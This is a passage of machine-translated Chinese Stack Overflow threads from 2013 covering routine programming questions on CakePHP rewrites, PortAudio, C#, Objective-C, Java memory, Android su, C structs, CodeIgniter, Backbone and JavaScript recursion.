http://exoticvoyages.ntechinfo.com/countries/index 
```

但是，如果我将以上所有页面重定向到[http://exoticvoyages.ntechinfo.com/](http://exoticvoyages.ntechinfo.com/)那么它工作正常。

主要的 .htaccess 文件是

```
<IfModule mod_rewrite.c>
RewriteEngine on
RewriteBase /
RewriteRule ^$ app/webroot/ [L]
RewriteRule (.*) app/webroot/$1 [L]
</IfModule> 
```

应用程序 .htaccess 文件是

```
<IfModule mod_rewrite.c>
    RewriteEngine on
    RewriteBase /app/
    RewriteRule    ^$    webroot/    [L]
    RewriteRule    (.*) webroot/$1    [L]
</IfModule> 
```

Webroot .htaccess 文件是

```
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteBase /app/webroot/
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteRule ^(.*)$ index.php [QSA,L]
</IfModule> 
```

谁能给我解决方案？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T06:46:28.053

检查`Rewritebase`.

[**看看**](http://cookingwithcakephp.blogspot.in/2008/04/installing-cakephp-into-subdirectory.html)，也在[**这里**](http://bakery.cakephp.org/articles/vanremortele/2011/05/08/cakephp_rewrites_on_windows_server_net_framework_4_0_extensionless_urls_fix)。

希望这能解决它。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-02-13T08:18:56.377

.htaccess 在 Windows IIS 上不起作用，等等蛋糕 php 你可以使用这个 [http://bakery.cakephp.org/articles/vanremortele/2011/05/08/cakephp_rewrites_on_windows_server_net_framework_4_0_extensionless_urls_fix](http://bakery.cakephp.org/articles/vanremortele/2011/05/08/cakephp_rewrites_on_windows_server_net_framework_4_0_extensionless_urls_fix)

# audio - 使用 PortAudio 生成正弦波以播放中间 C

> ID：14847612
> 
> 赞同：1
> 
> 时间：2013-02-13T06:18:12.417
> 
> 标签：audio, core-audio, portaudio, sound-synthesis

我无法在 PortAudio 中生成特定频率，每当我尝试更改频率内部的频率时`sin(n * FREQ * 2 * PI / SAMPLE_RATE)`，频率保持不变，但声音似乎确实在音色上发生了变化，我放在那里的频率值越高，声音就越难看，然而相同的频率。这就是我的`patestCallback`循环中的内容：

```
static int patestCallback( const void *inputBuffer, void *outputBuffer,
                           unsigned long framesPerBuffer,
                           const PaStreamCallbackTimeInfo *timeInfo,
                           PaStreamCallbackFlags statusFlags,
                           void *userData )
{
   paTestData *data = (paTestData*)userData;
   float *out = (float*)outputBuffer;

   (void) timeInfo;
   (void) statusFlags;
   (void) inputBuffer;
   unsigned long n = 0;
   for(unsigned long i = 0; i<framesPerBuffer;i++,n++){
      float v = sin ( 261.626 * 2 * M_PI * ((float) n / (float) TABLE_SIZE) );
      *out++ = v;
      *out++ = v;
   }

   return paContinue;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T10:39:24.187

简单的解决方案：

```
static unsigned long n = 0; 
```

您当前在每个函数调用中都进行了重置`n`，这会导致每个新缓冲区开始时的点击以及您听到的那些难听的声音。正弦周期与缓冲区长度的差异越大，听起来就越难看。

# active-directory - 什么时候可以扔掉 Windows 98、Windows 2000 等旧电脑书籍？

> ID：14847617
> 
> 赞同：-6
> 
> 时间：2013-02-13T06:18:28.230
> 
> 标签：active-directory, windows-xp, windows-server-2000, windows-2000

我有几本旧计算机书籍，标题为：Windows 98、Windows NT、Windows 2000 Professional、Windows 2000 Server、Windows 2000 目录服务设计、Windows 2000 目录服务管理等等…… Windows XP 即将进入睡眠状态并慢慢进入 Windows 7，直到他们觉得也可以休息。我想得到更新的书，但扔掉这些书感觉很奇怪，让我知道我需要用这些书做什么

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T06:22:34.707

你应该穿上红色的恶魔套装（比如 BSD 恶魔吉祥物）去海滩和他们一起生篝火。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T06:27:53.363

如果这些信息不再与当前版本的 Windows 相关，并且您不再使用这些版本，那么将它们拿出来进行回收。我还保留着一本 Windows 95 内部知识书籍，因为我发现它从 O/S 设计 POV 中很有趣。

# c# - 在 Web 浏览器控件 C# 中检索标记的偏移量

> ID：14847618
> 
> 赞同：-1
> 
> 时间：2013-02-13T06:18:29.667
> 
> 标签：c#, webbrowser-control, html

我需要获取标签的偏移位置...我 `HtmlElementCollection sp = textwebBrowser1.Document.GetElementsByTagName("span");` 用来获取跨度标签的集合....但在某些情况下，即使我在页面中有跨度标签，集合的计数为零...我猜这是因为一些带有图像信息的对象标签...例如-

在这种情况下，我不知道如何检索 span 标签的偏移量

HTML 代码：

```
<HTML><BODY>.....Using <OBJECT> and <EMBED><HTML><HEAD><TITLE>A Web page with a rolling die</TITLE></HEAD><BODY><OBJECT ID="Dieroll1"CLASSID="CLSID:46646B43-EA16-11CF-870C-00201801DDD6"CODEBASE="diero‌​ll.cab#Version=1,0,0,1"WIDTH="200"HEIGHT="200"><PARAM NAME="ForeColor" VALUE="0"><PARAM NAME="BackColor" VALUE="16777215"><PARAM NAME="Image" VALUE="beans.bmp"><EMBED LIVECONNECT NAME="Dieroll1"WIDTH="200"HEIGHT="200"CLASSID="CLSID:46646B43-EA16-11CF-870C-002‌​01801DDD6"TYPE="application/oleobject"CODEBASE="dieroll.cab#Version=1,0,0,1"PARAM‌​_ForeColor="0"PARAM_BackColor="16777215"></OBJECT><BR>Hthe die</BODY></HTML>Arrange to run Explorer when you debug the control.Here's the syntax for an OBJECT tag that sets the Image property:<OBJECTCLASSID="clsid:46646B43-EA16-11CF-870C-00201801DDD6"CODEBASE="http://www.gregcons.com/test/dieroll.ocx"ID=die1WIDTH=200HEIGHT=200ALIGN=centerHSPACE=0VSPACE=0><PARAM NAME="Dots" VALUE="1"><PARAM NAME="Image" VALUE="http://www.gregcons.com/test/beans.bmp">and the <span style='background-color: rgb(255, 255, 0);'>image</span> file you are using....</BODY></HTML> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T06:39:08.253

为 span 标签提供一个 id 并使用

`document.getElementById('id')`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T09:14:13.540

我在你的问题中使用了你的 html 代码，我得到了所有带有以下代码的 span 标签：（代码必须在页面加载后运行）

> ```
>  void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
>     {
>         List<HtmlElement> spanelement = new List<HtmlElement>();
>         foreach (HtmlElement span in webBrowser1.Document.GetElementsByTagName("span"))
>         {
>             spanelement.Add(span);
>             //Or Add Offset
>             //spanelement.Add(span.OffsetRectangle.Top;);
>         }
>     } 
> ```

# objective-c - 无法重置 UIImageView

> ID：14847625
> 
> 赞同：0
> 
> 时间：2013-02-13T06:18:58.270
> 
> 标签：objective-c, xcode, uiimageview, uiimagepickercontroller

我正在开发一个 iOS 应用程序，它可以允许用户从图库（UIImagePicker）中选择图像并在不同视图控制器中的 UIImageView 中显示图像。

在我的 cameraViewController.m 中，当调用 didFinishPickingMediaWithInfo 时，它会调用 UploadView 中的 setImageNow 方法。

```
-(void)imagePickerController:(UIImagePickerController *)picker
didFinishPickingMediaWithInfo:(NSDictionary *)info
{
    NSString *mediaType = [info objectForKey:UIImagePickerControllerMediaType];
    [picker dismissModalViewControllerAnimated:YES];
    if ([mediaType isEqualToString:(NSString *)kUTTypeImage]) {
        UIImage *image = [info
                      objectForKey:UIImagePickerControllerOriginalImage];

        imageView = [[UIImageView alloc]initWithImage:image];

        **UploadView *myUploadViewController = [[UploadView alloc]init];
        [myUploadViewController setImageNow:imageView.image];**
    }
} 
```

在我的 UploadView.m 中，

```
- (void)setImageNow:(UIImage*)image{
    NSLog(@"yy: %@",image);
    if(image != nil){
        [selectedImageView setImage:image];
        NSLog(@"xx: %@",selectedImageView.image);
        }
} 
```

xx 和 yy 的 NSLog 值是相同的，所以我认为它验证了 selectedImageView 已更改为用户选择的新图像。但是，在用户界面中，不会显示新图像。默认图像仍然存在。加载视图时，为 selectedImageView 设置了默认图像，代码在这里：

```
- (id)initWithFrame:(CGRect)frame {
    if (!(self = [super initWithFrame:frame]))
        return nil;
    NSArray* nibViews = [[NSBundle mainBundle] loadNibNamed:@"UploadView" owner:self options:nil];
    UIView* myView = [nibViews objectAtIndex: 0];
    [super addSubview:myView];
    return self;
} 
```

我尝试了不同的方法来解决这个问题，但它们都不起作用。有谁知道我的代码有什么问题？谢谢！

# c# - 使用 For 循环添加到列表列表时出错 (ArgumentOutOfRangeException)

> ID：14847626
> 
> 赞同：0
> 
> 时间：2013-02-13T06:19:08.547
> 
> 标签：c#, list, unity3d

第一次来这里。StackOverflow 帮助我对数组和列表有所了解，但我遇到了一个我在其他地方看不到答案的问题。

目标：获取一个现有的多维数组，读取每一行，如果它以正确的标识符开头，则将该行放入列表中。每个列表都成为我列表的一部分。

问题：如果我使用 newGrid[0].Add(CSVReader.grid[x,y]); 在它下面运行良好。但是如果我使用 [y] 而不是 [0] 我会得到一个异常。在我遇到异常时，y = 0 不是吗？我想使用 for 循环的 y 使从数组中拉出的每一行都成为一个新列表。

```
 public void processCSV () {

    List<List<string>> newGrid = new List<List<string>>();

    for (int y = 0; y < CSVReader.grid.GetUpperBound(1); y++) {
        if (CSVReader.grid[0,y] == "T1") {
            newGrid.Add(new List<string>());
            for (int x = 0; x < CSVReader.grid.GetUpperBound(0); x++) {
                newGrid[y].Add(CSVReader.grid[x,y]);    
            }
            foreach(string item in newGrid[y]) {    
                print(item);
            }

        }
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T06:24:52.130

您中的行号与中的`newGrid`行号不匹配，`CSVReader.grid`因为您只从源数组中复制了一些行。

而不是重复`y`使用单独的变量来计算`newGrid`每次调用时的行数，`newGrid.Add`或者只是将元素添加到最后一行。

# java - 从 Java OutOfMemory 异常中恢复

> ID：14847629
> 
> 赞同：0
> 
> 时间：2013-02-13T06:19:26.617
> 
> 标签：java, out-of-memory, heap-memory

我正在使用 Spring、Hibernate、Java 1.6 等。我有一个复杂的逻辑，它在一个方法中创建了多个 Arralists 和 Maps。数据从数据库加载到列表中，然后进行操作以使数据为 jsp 页面做好准备。如果从该页面快速多次执行相同的操作，则它会频繁地执行该操作。由于使用列表和映射处理大量数据，应用程序会抛出 Java Heap OutOfMemory。

如果我应用 -Xms -Xmx，那么它会在一定程度上有所帮助，如果我的数据增长，这个选项将失去内存问题。我想知道，一旦我们操作并将列表传递给 Jsp 页面的模型，有什么方法可以清除列表。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T07:00:38.277

您无法从 OOM 中恢复，因为您永远不知道它何时何地会袭击您。

尝试使用 google 的 guava 中的惰性集合来操作数据，而无需创建额外的副本。使用游标和迭代器来避免存储在内存中的完整数据。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T07:03:03.393

尝试使用分布式内存缓存解决方案，例如 - ehcache、Memcached、oracle coherence。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T06:36:14.933

尝试将 SoftReferences 用于内存中需要的一些大资源。

组织缓存以从内存中释放不必要的内容。参见例如[ehCache](http://ehcache.org/)

# c# - 文本框值更改未反映在 C# 后面的代码中

> ID：14847635
> 
> 赞同：1
> 
> 时间：2013-02-13T06:19:53.370
> 
> 标签：c#, javascript, jquery, .net-1.1, visual-studio-2003

我正在使用带有 C# 的 .NET 框架 1.1。我的问题描述如下。

1.  我有 id:= *txtFromDate*的服务器端文本框控件。视图状态已启用并且它是只读的。
2.  第一次加载页面时，我在上面的文本框中设置当前日期值。
3.  之后，我用 jQuery 更改文本框的值。
4.  然后使用带有一些 __EVENTTARGET 参数的 jQuery 发回页面。
5.  我在后面的代码中使用了这个更改的文本框值。

我在 1.1 框架的 32 位 windows XP 机器上开发了代码。但现在我已将整个站点放在 .NET 2.0 应用程序池中的 Windows Server 2008 R2 版（64 位）上

*问题：*它在开发机器上运行良好。但在 Windows Server 2008 中，jQuery 对文本框值的更改并未反映在后面的代码中。它保留了我在第一次加载页面时分配的旧值。

我想在我的开发机器上运行这个应用程序。简而言之，我也想在 Windows Server 2008 机器上的代码隐藏中更改文本框的值。

谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-21T08:00:16.057

我没有使用**txtFromDate.Text**，而是使用了**Request.Form[txtFromDate.ClientID]**并且问题得到了解决。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-12-28T17:45:32.667

服务器后面的代码无法访问您对客户端控件所做的更改，除非这些更改是对输入控件的值进行的。因此，您还可以使用 hiddenfield 以及您想在 javascript/Jquery 中更改的标签，然后将新标签值存储在 hiddenfield 中，然后从隐藏字段中的标签中读取值，而不是从隐藏字段中读取值。

```
<asp:hiddenfied id="hdnLblValue" runat="server"/> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-06-03T19:43:11.567

虽然你总是可以使用 set get 方法来存储来自 java 脚本的值......但这里有一些简单的方法来解决它......

案例 1 - 如果控件仅用于存储目的，请将 display : none 放在它的样式中，并在控件的属性中设置 visible = true 。

情况 2 - 如果要显示控件但在禁用模式下放置 ReadOnly="true" 而不是 Enabled = true

例如..

```
<asp:textbox runat="server" ID="textbox1" Enabled="false"></asp:textbox> will not work

<asp:textbox runat="server" ID="textbox2" ReadOnly="true"></asp:textbox> will work 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-10-08T10:40:32.717

```
clientIDMode="Static" 
```

将完美地工作。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2022-01-03T08:22:26.013

**需要牢记**

1.  如果有任何服务器控件示例：TextBox。从 Aspx 页面或代码后面被禁用或只读。

2.  它的值正在从 JQuery 或 Javascipt 更改。

3.  您尝试从后面的代码中获取此控件的更改值，那么您将永远无法获得它。

4.  当您回发此控件时，服务器将验证该属性（如果已禁用或只读，则服务器将不会接受此控件的更改值。

5.  您需要使用隐藏字段并使用此控件的更改值填充此隐藏字段。

    <asp:HiddenField runat="server" ID="hdnTextBoxValue"/>

**您需要通过 JQuery 或 Javascript 将更改的值设置为隐藏字段并从 Code behind 中获取值。**

# android - 通过 android 应用程序执行时的“su”命令问题

> ID：14847637
> 
> 赞同：0
> 
> 时间：2013-02-13T06:19:57.000
> 
> 标签：android, shell, su

您好我正在尝试通过应用程序执行以下“su”命令。

```
Process process = Runtime.getRuntime().exec("su");
process.waitFor();
Log.d("EXITVAL",Integer.toString(process.exitValue())); 
```

我得到退出值 1 ..它为其他命令（如“id”）返回 0

我通过命令提示符检查了它，它没有显示任何错误（如下所示）。

```
root@android:/ #su
root@android:/ # 
```

这是否意味着模拟器已植根？如果是，那么真正的问题是什么？谁能指导我..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T07:21:21.827

我**怀疑**您在有问题的手机上缺少**超级用户**，是吗？或者至少有关超级用户的某些内容可能是错误的（版本，二进制文件......）

su 调用是否允许 root 访问的超级用户。

最新版本的超级用户似乎出现了许多问题。

尝试**删除**它并**安装**其他版本：

[http://goo.im/superuser](http://goo.im/superuser)

另一个注意事项：如果您尝试获得 root 访问权限或以 root 身份执行命令，则不应仅使用`exec("su")`. 看看由 stericson 自己编写的**RootTools**库；）

[http://code.google.com/p/roottools/](http://code.google.com/p/roottools/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T07:12:55.827

Android 应用程序没有运行权限`su`。只有`root`和`shell`用户被允许运行`su`。

# c# - 如何使用 C#.Net Form 应用程序以另一种形式显示 gridview 的选定行？

> ID：14847641
> 
> 赞同：1
> 
> 时间：2013-02-13T06:20:41.123
> 
> 标签：c#, asp.net, .net

如何使用 C#.Net Form 应用程序以另一种形式显示 gridview 的选定行？

请用编码回答这个问题。我无法以另一种形式访问第一个表单 gridview。我想将 gridview 值存储在另一个表单文本框中。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T07:02:42.437

如果它是您之后的行，那么最简单的方法是让每一行都是一个数据绑定对象。您可以使用任何包含属性的类来执行此操作。

```
class Foo
{
    public string Column1 { get; set; }
    public float Column2 { get; set; }
    public int Column3 { get; set; }
} 
```

接下来，将 Foo 类型的绑定列表附加到您的 dataGridView。您可能希望自己填充此列表或允许用户使用 dataGridView 填充该列表。

```
BindingList<Foo> source = new BindingList<Foo>();

// Add items/rows to list if needed...

dataGridView.DataSource = source; 
```

当您想要获取选定的行时，只需使用 dataGridView 的 SelectedRows 属性即可。每行包含一个 DataBoundItem 属性，该属性保存原始绑定列表的数据对象。如何使用它的一个示例是创建一个新的选定对象列表，然后您可以将其传递到您的第二个表单以进行查看或修改。

```
List<Foo> selected = new List<Foo>();
foreach (DataGridViewRow row in dataGridView1.SelectedRows)
    selected.Add(row.DataBoundItem as Foo);

// Assuming your second form has a property for the list to be passed into.

form2.SelectionList = selected; 
```

# c - 如何创建结构数组，其中结构的最后一个元素是结构黑客

> ID：14847643
> 
> 赞同：1
> 
> 时间：2013-02-13T06:20:47.393
> 
> 标签：c, struct

假设我有以下类型的结构：

```
struct employee
    {
        int     emp_id;
        int     name_len;
        char    name[0];
    }; 
```

我知道

```
struct employee *e = malloc(sizeof(*e) + sizeof(char) * 128); 
```

相当于

```
struct employee
{
    int     emp_id;
    int     name_len;
    char    name[128]; /* character array of size 128 */
}; 
```

我的问题是，当结构中的最后一个元素是 struct hack 时，我可以创建一个此类结构的数组吗？

示例：我想创建一个结构数组employee[3]；以便

employee[0] 可以等价于

```
 struct employee
    {
        int     emp_id;
        int     name_len;
        char    name[128]; /* character array of size 128 */
    }; 
```

雇员[1] 可以等价于

```
struct employee
    {
        int     emp_id;
        int     name_len;
        char    name[256]; /* character array of size 256 */
    }; 
```

雇员[2] 可以等价于

```
struct employee
    {
        int     emp_id;
        int     name_len;
        char    name[512]; /* character array of size 512*/
    }; 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-13T06:25:17.360

不，由于各种原因，你不能这样做，但你可以制作一个像这样的数组：

```
struct employee *all[...]; 
```

如果你不这样做，你将需要：

```
struct employee {
  ...
  char *name;
} 
```

...并且您将需要每个`name`动态分配和分配。

如果您考虑一下，数组中的每个元素都必须具有相同的长度。如果没有，它如何被索引？此外，该长度必须在编译时知道。

但是如果每个`employee`元素都是一个指针，那么您可以使用 struct hack 使每个元素具有不同的大小，具体取决于`name[]`.

# php - 如何使 codeigniter 文件夹成为我的根文件夹？

> ID：14847644
> 
> 赞同：1
> 
> 时间：2013-02-13T06:20:50.367
> 
> 标签：php, codeigniter, mod-rewrite, root

我已将 codeigniter 文件放在名为 CI_Folder 的单独文件夹中。该文件夹位于根目录中。index.php 也位于根目录中。

目前，当我输入 URL www.xyz.com 时，会显示 index.php。

我想在 codeigniter 中创建一个网站，这样当有人进入 www.xyz.com 时，他应该看到控制器正在加载的网页，即他应该被重定向到 CI_Folder。

这可能吗？如果是，我应该怎么做？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T06:38:30.850

不知道你为什么要这样做，反正它很简单：

1.  将 codeigniter 的 index.php 放在你的根目录中
2.  打开所说的 index.php 并更改`$system_path`and`$application_folder`以反映文件夹的位置。例如，如果您将整个“codeigniter”文件夹放在您的根目录中，它将是：

    ```
     $system_path = './codeigniter/system';
     $application_folder = './codeigniter/application'; 
    ```

这是您现在的文件夹结构：

```
[webroot]
     index.php  (taken out from codeigniter package)
     codeigniter/
          application/
          system/ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T06:43:38.057

在`index.php`codeigniter 的文件中（在 codeigniter 文件夹中），可以选择指定`system`文件夹和`application`文件夹的位置和名称。指定它们并使用`.htaccess`

我有以下重写选项

```
 <IfModule mod_rewrite.c>
  Options +FollowSymlinks
  RewriteEngine On
 </IfModule>

<IfModule mod_rewrite.c>
  RewriteCond %{REQUEST_FILENAME} !-f
  RewriteCond %{REQUEST_FILENAME} !-d
  RewriteRule ^(.*)$ /index.php?$1 [L]
</IfModule> 
```

根据您的要求进行适当修改。我希望它有所帮助。

# c# - 多次连续启动尝试导致应用程序在 WP7 中出现无响应

> ID：14847647
> 
> 赞同：1
> 
> 时间：2013-02-13T06:20:52.880
> 
> 标签：c#, silverlight, windows-phone-7

在我的 WP7 应用程序中，当多个顺序启动（启动应用程序 > 菜单 > 启动应用程序 > 菜单 > 等...）时，应用程序无响应。经过大约 5 或 6 次迭代后，Splashscreen 只会停留几秒钟。这是什么原因？请帮我。

# iphone - 加载一个xib文件

> ID：14847650
> 
> 赞同：0
> 
> 时间：2013-02-13T06:20:58.047
> 
> 标签：iphone, ios, uiview, uiviewcontroller, xib

你好我只是一个初学者。

我创建了一个新的 xib 文件。现在我试图像下面的代码一样调用它，但它不起作用。

这是我在文件所有者中所做的：

![在此处输入图像描述](../Images/2a0289dceb6a20856f9380fb59ec93e2.png)

```
UIViewController *controller;
controller = [[UIViewController alloc]initWithNibName:@"UserFeedback" bundle:nil];
[self.view addSubview:controller.view]; 
```

我得到的错误是：

```
*** Terminating app due to uncaught exception 'NSInternalInconsistencyException', reason: '-[UIViewController _loadViewFromNibNamed:bundle:] loaded the "UserFeedback" nib but the view outlet was not set.' 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T06:22:41.380

我希望，你已经创建了“controller.h”和“controller.m”UIViewController。

然后将类“控制器”放入“UserFeedback”.xib 文件中。

并将视图对象与“UserFeedback”.xib 文件绑定。

试试这个，让我知道。

几乎你会获得成功。

干杯!

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T06:25:29.483

这是您可以使用的技术：

UIViewController *控制器；控制器 = [[UIViewController alloc]initWithNibName:@"UserFeedback" bundle:nil]; [self.view addSubview:controller.view];

上面的代码是正确的，但首先你检查控制器视图是否绑定..我认为错误是说你没有绑定控制器视图

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T06:27:29.393

下图可以帮助你理解

![在此处输入图像描述](../Images/bd63ca436345cf926f5227f92821ab28.png).

正如我现在从您的代码中看到的那样

```
 ATMoviePlayerController *controller;
 controller = [[ATMoviePlayerController alloc]initWithNibName:@"UserFeedback" bundle:nil];
 [self.view addSubview:controller.view]; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-13T07:17:53.467

似乎在情节提要中正确设置了插座，但是在代码中访问它时，您可能必须修改一些代码。

```
AFMoviePlayerController *controller = [[AFMoviePlayerController alloc]initWithNibName:@"UserFeedback" bundle:nil];
[self.view addSubview:controller.view]; 
```

# javascript - Backbone Routes / View <= 将我所有的路由放入 Views

> ID：14847655
> 
> 赞同：0
> 
> 时间：2013-02-13T06:21:28.073
> 
> 标签：javascript, backbone.js, view, routes

在视图内设置路线并在那里进行事件是否合理？想要使用逻辑从我的视图中传递 action-url 并从我的 AppRoute 类调用一个函数作为回调。

我尽量避免使用字符串作为事件名称，并且我希望它易于扩展。所以可以在不改变 AppRoutes 逻辑的情况下创建视图。

AppRoutes.js

```
Not working code just for demonstration. 

foreach(view in myViewArry)
{
    route(view.url : view.loadAction);
} 
```

View1.js

```
var id = "#View1";
var url = "View1";
function loadAction(id) { logic... }; 
```

View2.js

```
var id = "#View2";
var url = "View2";
function loadAction(id) { logic... }; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T07:57:04.023

Backbone 内置了路由，因此无需在视图中混合路由。

看看文档： [http ://backbonejs.org/#Router](http://backbonejs.org/#Router)

这个例子： [http ://backbonetutorials.com/what-is-a-router/](http://backbonetutorials.com/what-is-a-router/)

# c# - 使用 c# 或 vb.net 获取最终生成的 html 源代码

> ID：14847656
> 
> 赞同：9
> 
> 时间：2013-02-13T06:21:30.457
> 
> 标签：c#, vb.net

使用 VB.net 或 c#，如何获取生成的 HTML 源代码？

要获取页面的 html 源代码，我可以在下面使用它，但这不会获取生成的源代码，它不会包含任何由浏览器中的 javascript 动态添加的 html。如何获得最终生成的 HTML 源代码？

谢谢

```
WebRequest req = WebRequest.Create("http://www.asp.net"); 
WebResponse res = req.GetResponse(); 
StreamReader sr = new StreamReader(res.GetResponseStream()); 
string html = sr.ReadToEnd(); 
```

如果我在下面尝试这个，那么它会返回没有注入 JavaScript 代码的文档

```
Public Class Form1

    Dim WB As WebBrowser = Nothing

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        WB = New WebBrowser()
        Me.Controls.Add(WB)
        AddHandler WB.DocumentCompleted, AddressOf WebBrowser1_DocumentCompleted

        WB.Navigate("mysite/Default.aspx")

    End Sub

    Private Sub WebBrowser1_DocumentCompleted(sender As Object, e As WebBrowserDocumentCompletedEventArgs)

        'Dim htmlcode As String = WebBrowser1.Document.Body.OuterHtml()
        Dim s As String = WB.DocumentText

    End Sub
End Class 
```

返回的 HTML

```
<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title></title>

</head>
<body>
    <form id="form1" runat="server">
    <div id="center_text_panel">
    //test text  this text should be here
    </div>
    </form>
</body>
</html>

    <script type="text/javascript">

        document.getElementById("center_text_panel").innerText = "test text";

    </script> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T06:24:21.960

您可以使用[WebKit.NET](http://sourceforge.net/projects/webkitdotnet/)

[看这里](http://webkitdotnet.sourceforge.net/basics.php)官方教程

这样不仅可以抓取源码，还可以通过pageload事件处理javascript。

```
webKitBrowser1.Navigate(MyURL) 
```

然后，处理 DocumentCompleted 事件，然后：

```
private documentContent = webKitBrowser1.DocumentText 
```

**编辑**- 这可能是更好的开源 WebKit 选项：[http ://code.google.com/p/open-webkit-sharp/](http://code.google.com/p/open-webkit-sharp/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T06:28:44.383

只需`webbrowser`在您的表单中添加一个控件，然后您就可以运行代码：

```
 webBrowser1.Navigate("YourLink");

     private void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {
           string htmlcode= webBrowser1.Document.Body.InnerHtml;//Or Each Filed Or element..//WebBrowser.DocumentText
        } 
```

**已编辑**

要获取由 java 脚本代码动态生成的 html 代码，您有两种方法：

1.  `webBrowser1_DocumentCompleted`在事件之后运行流动代码

> ```
>  StringBuilder htmlcode = new StringBuilder();
>             foreach (HtmlElement item in webBrowser1.Document.All)
>             {
>                 htmlcode.Append( item.InnerHtml);
>             } 
> ```

1.  编写一个用于返回`document.documentElement.innerHTML`和使用 InvolkeScript 函数返回结果的 javascript 代码：

> ```
>  var htmlcode = webBrowser1.Document.InvokeScript("javascriptcode"); 
> ```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-06-29T15:36:53.483

您可以使用以下代码：

```
webBrowser1.Document.Body.OuterHtml 
```

# javascript - 没有settimeout的递归js函数

> ID：14847657
> 
> 赞同：1
> 
> 时间：2013-02-13T06:21:33.963
> 
> 标签：javascript, recursion

我正在尝试将一个正在工作的 PHP 函数重写为 javascript，因为我需要在浏览器端完成工作并将事件处理程序添加到我希望添加到我的页面的对象中。

该函数采用具有父子关系的节点数组，查看节点，然后查看其子节点，然后查看其子节点等（直到找到树的末尾）。

工作 PHP 函数：

```
//print nodes
function display_child_nodes($parent_id, $level) {
global $task_list, $index;
    if(isset($index[$parent_id]))
        {
            foreach ($index[$parent_id] as $id) {
                echo str_repeat("-", $level) . $task_list[$id]["title"] . "<br />";
                display_child_nodes($id, $level + 1);
            }
        }
}
display_child_nodes(0, 0); 
```

PHP 函数的结果如下所示：

乙

-C

-D

--E

F

G

这是我尝试编写的 Javascript，但我怀疑在该函数中调用函数 show_child_nodes 表单不是正确的 JS ...

该函数正确生成第一个节点，但在尝试分析子节点时立即停止，因此我怀疑来自函数内部的调用是问题所在。

javascript 接收来自 php 脚本的 json 数组，它包含节点（任务）列表及其详细信息，以及 order_index 数组，其结构为 [parent_id1 => array[1,2,3], parent_id2 => [4 ,5], parent_id3 => [6,7,8]] 等等...如，每个 parent_id 都是一个键，其子 ID 作为值。

这是JSON：

```
{"tasks":{"2":{"id":"2","title":"Task 2","desc":"Task 2 description","parent_id":"0"},"6":{"id":"6","title":"Task 6","desc":"Task 6 description","parent_id":"0"},"1":{"id":"1","title":"Task 1","desc":"Task 1 description","parent_id":"2"},"3":{"id":"3","title":"Task 3","desc":"Task 3 description","parent_id":"1"},"4":{"id":"4","title":"Task 4","desc":"Task 4 description","parent_id":"1"},"5":{"id":"5","title":"Task 5","desc":"Task 5 description","parent_id":"3"}},"order_index":{"0":["2","6"],"2":["1"],"1":["3","4"],"3":["5"]}}

            $.getJSON("get_items_hierarchy.php",function(data,status){

                var order_index = data.order_index;
                var tasks = data.tasks;
                var output = [];

                function show_child_nodes(parent_id,level){
                    if(order_index[order_index[parent_id]])
                        {
                            $.each(order_index[parent_id],function(index,id){
                                var margin = level * 40;
                                output.push('<div style="float: left; clear: left; margin-left: ' + margin + 'px">' + tasks[id]['title'] + '</div> ');
                                show_child_nodes(id, level + 1);
                            });
                        }
                }
                show_child_nodes(0,0);

            $.each(output,function(index,line){
                $("#tasks").append(line);
            });

    }); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T06:35:34.913

这似乎可以解决它。

**演示：** [[[[![jsFiddle](../Images/827f57786617d886d70c0bce0ccca6b6.png)](http://jsfiddle.net/ThinkingStiff/t9Bu5/)]]]

更改此行：

```
if(order_index[order_index[parent_id]]) 
```

到：

```
if( order_index[parent_id] ) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T07:01:11.817

我看不出算法本身有什么问题，但以下部分可能是个问题：

```
$.each(output, function(index,line){
    $("#tasks").append(line);
}); 
```

此代码引用 的值`output`，但是：

1.  `$.getJSON`是异步的，所以值还没有准备好。

2.  该变量只能从 AJAX 回调内部访问。

